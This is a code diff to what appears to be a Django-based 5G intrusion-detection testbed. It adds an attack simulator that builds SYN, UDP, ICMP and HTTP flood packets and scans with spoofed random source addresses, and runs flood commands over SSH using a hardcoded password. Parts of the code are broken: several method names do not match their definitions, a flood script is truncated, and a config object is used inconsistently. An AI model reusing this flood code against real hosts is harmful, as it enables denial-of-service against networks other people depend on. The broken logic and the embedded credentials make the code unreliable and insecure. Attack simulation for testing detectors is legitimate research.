@@ -12,15 +12,17 @@ import os
 import io
 import csv
 import subprocess
+import tempfile
 import paramiko
 import glob
+import time
 
 from datetime import datetime, timedelta
 from collections import deque, defaultdict
 
 from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.l2 import Ether
-from scapy.all import rdpcap
+from scapy.all import *
 
 from django import forms
 from django.shortcuts import render
@@ -189,7 +191,7 @@ def receive_network_data(request):
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
             # Modify the (HOST, USERNAME, PASSWORD) as needed to connect to the server
-            ssh.connect('192.168.0.115', username='server2', password='mmuzte123', timeout=30)
+            ssh.connect('192.168.0.115', username='open5gs', password='mmuzte123', timeout=30)
             _stdin, _stdout, _stderr = ssh.exec_command(" service open5gs-amfd status")
             output = _stdout.readlines()
             
@@ -265,33 +267,144 @@ def perform_detection(features):
 # Simulate different types of network attacks by injecting attack into the 5G Network
 class AttackSimulator:
     def __init__(self, host, username, password):
-        self.host = host
-        self.username = username
+        self.host = host or "192.168.0.115"
+        self.username = username or "open5gs"
         self.password = password or "mmuzte123"
 
     # Trigger a DoS attack (SYNFlood) on the specified target IP
-    def trigger_dos_attack(self, target_ip, attack_type="SYNFlood"):
+    def trigger_dos_attack(self, target_ip, attack_type, duration=30, speed=50, port=80):
         try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(self.host, username=self.username, password=self.password, timeout=10)
-
-            attack_command = {
-                'SYNFlood': f'sudo hping3 -S -p 80 --flood {target_ip}'
-            }
-
-            command = attack_command.get(attack_type, attack_command['SYNFlood'])
-
-            if command:
-                stdin, stdout, stderr = ssh.exec_command(f'timeout 30 {command}')
-                logger.info(f"{attack_type} attack triggered on {target_ip}")
-
-                ssh.close()
-                return True
-        
+            if self.host != "localhost" and self.host != "127.0.0.1":
+                return self.trigger_remote_attack(target_ip, attack_type, duration, speed, port)
+            else:
+                return self.trigger_remote_attack(target_ip, attack_type, duration, speed, port)
+            
         except Exception as e:
             logger.error(f"Attack simulation error: {e}")
             return False
+    
+    def trigger_remote_attack(self, target_ip, attack_type, duration, speed, port):
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(self.host, username=self.username, password=self.password, timeout=15)
+
+            # Create flood script on remote host
+            flood_script = self._generate_flood_script()
+
+            # Upload flood script to remote host
+            with ssh.open_sftp() as sftp:
+                with sftp.file('/tmp/flood_attack.py', 'w') as f:
+                    f.write(flood_script)
+            
+            # Execute attack
+            attack_command = self._build_attack_command(target_ip, attack_type, duration, speed, port, remote=True)
+
+            if attack_command:
+                stdin, stdout, stderr = ssh.exec_command(f'cd /tmp && timeout {duration + 5} {attack_command}')
+                logger.info(f"{attack_type} attack triggered on {target_ip} via SSH")
+                ssh.close()
+                return True
+            
+        except Exception as e:
+            logger.error(f"Remote attack execution error: {e}")
+            return False
+        
+    def trigger_local_attack(self, target_ip, attack_type, duration, speed, port):
+        try:
+            # Build packet based on attack type
+            pkt = self._build_packet(target_ip, attack_type, port)
+            if not pkt:
+                return False
+            
+            # Calculate delay between packets
+            delay = 0 if speed == 0 else (1.0/speed)
+
+            # Start attack in a separate thread to avoid blocking
+            attack_thread = threading.Thread(target=self.execute_flood_attack, args=(pkt, duration, delay, attack_type, target_ip, port))
+            attack_thread.daemon = True
+            attack_thread.start()
+
+            return True
+        
+        except Exception as e:
+            logger.error(f"Local attack execution error: {e}")
+            return False
+        
+    def execute_flood_attack(self, pkt, duration, delay, attack_type, target_ip, port):
+        try:
+            start_time = time.time()
+            packet_count = 0
+
+            print(f"Starting {attack_type.upper()} flood on {target_ip}:{port} for {duration} seconds... ")
+
+            while(time.time() - start_time) < duration:
+                send(pkt, verbose=0, inter=delay, count=1)
+                packet_count += 1
+
+                # Update packet for variety (randomize source)
+                if attack_type in ["ICMPFlood", "SYNFlood", "UDPFlood"]:
+                    pkt = self.build_packet(target_ip, attack_type, port)
+
+            print(f"Attack finished after {duration} seconds. Send {packet_count} packets.")
+        
+        except KeyboardInterrupt:
+            print("Attack stopped by user.")
+        
+        except Exception as e:
+            logger.error(f"Error flood attack execution: {e}")
+        
+    def build_packet(self, target_ip, attack_type, port):
+        try:
+            if attack_type == "ICMPFlood":
+                return IP(dst=target_ip, src=RandIP())/ICMP()/("X"*600)
+            
+            elif attack_type == "SYNFlood":
+                return IP(dst=target_ip, src=RandIP())/TCP(sport=RandShort(), dport=port, flags="S")
+            
+            elif attack_type == "UDPFlood":
+                return IP(dst=target_ip, src=RandIP())/UDP(sport=RandShort(), dport=port)/Raw(load="X"*600)
+            
+            elif attack_type == "HTTPFlood":
+                http_payload = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n".format(target_ip)
+                return IP(dst=target_ip, src=RandIP())/TCP(sport=RandShort(), dport=port, flags="PA")/Raw(load=http_payload)
+            
+            elif attack_type == "SYNScan":
+                return IP(dst=target_ip, src=RandIP())/TCP(sport=RandShort(), dport=RandShort(), flags="S")
+            
+            elif attack_type == "UDPScan":
+                return IP(dst=target_ip, src=RandIP())/UDP(sport=RandShort(), dport=RandShort())
+            
+            elif attack_type == "TCPConnectScan":
+                return IP(dst=target_ip, src=RandIP())/TCP(sport=RandShort(), dport=RandShort(), flags="S")
+            
+            elif attack_type == "SlowrateDoS":
+                return IP(dst=target_ip, src=RandIP())/ICMP()/("x"*600)
+        
+        except Exception as e:
+            logger.error(f"Error packet building: {e}")
+            return None
+        
+    def build_attack_command(self, target_ip, attack_type, duration, speed, port, remote=False):
+        if remote:
+            base_cmd = f"python3 flood_attack.py {target_ip}"
+            
+            if attack_type == "ICMPFlood":
+                return f"{base_cmd} -1 -t {duration} -s {speed}"
+            elif attack_type == "SYNFlood":
+                return f"{base_cmd} -S -p {port} -t {duration} -s {speed}"
+            elif attack_type == "UDPFlood":
+                return f"{base_cmd} --udp -p {port} -t {duration} -s {speed}"
+            elif attack_type == "HTTPFlood":
+                return f"{base_cmd} -S -p 80 -t {duration} -s {speed}"
+            else:
+                return f"{base_cmd} -1 -t {duration} -s {speed}"
+        return None
+
+    def _generate_flood_script(self):
+        """Generate the flood script content for remote execution"""
+        return ''#!/usr/bin/env python3
+    
 
 # Analyze attack severity levels using network features and patterns
 class SeverityLevelAnalyzer:
@@ -486,7 +599,7 @@ class AIMitigation:
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         # Modify the (HOST, USERNAME, PASSWORD) as needed to connect to the server
-        ssh.connect('192.168.0.115', username='open5gs', password='mmuzte123', timeout=30)
+        # ssh.connect('192.168.0.115', username='open5gs', password='mmuzte123', timeout=30)
 
         def http_flood_mitigation(self, ssh):
             _stdin, _stdout, _stderr = ssh.exec_command("sudo iptables -I INPUT 2 -j prohibited_traffic")
@@ -543,6 +656,9 @@ def start_attack(request):
     if request.method == "POST":
         attack_type = request.POST.get('attack_type', 'SYNFlood')
         target_ip = request.POST.get('target_ip', '192.168.0.115')
+        duration = int(request.POST.get('duration', 30))
+        speed = int(request.POST.get('speed', 50))
+        port = int(request.POST.get('port', 80))
 
         config = OPEN5GS_CONFIG[0] if OPEN5GS_CONFIG else {}
         host = OPEN5GS_CONFIG.get('HOST', '192.168.0.115')
@@ -550,7 +666,7 @@ def start_attack(request):
         password = config.get('PASSWORD', 'mmuzte123')
         simulator = AttackSimulator(host, username, password)
         
-        if simulator.trigger_dos_attack(target_ip, attack_type):
+        if simulator.trigger_dos_attack(target_ip, attack_type, duration, speed, port):
             attack_status = f"Attack simulation started. {attack_type} attack injected on {target_ip}"
         else:
             attack_status = "Failed to inject attack"
@@ -838,7 +954,7 @@ def home(request):
 
                 else:  
                     attack_status = "Under Attack!"
-                    #mitigation = AIMitigation.get_mitigation(detection, analysis_report)
+                    mitigation = AIMitigation.get_mitigation(detection, analysis_report)
                 # Will implement mitigation strategies
 
             except json.JSONDecodeError as e:
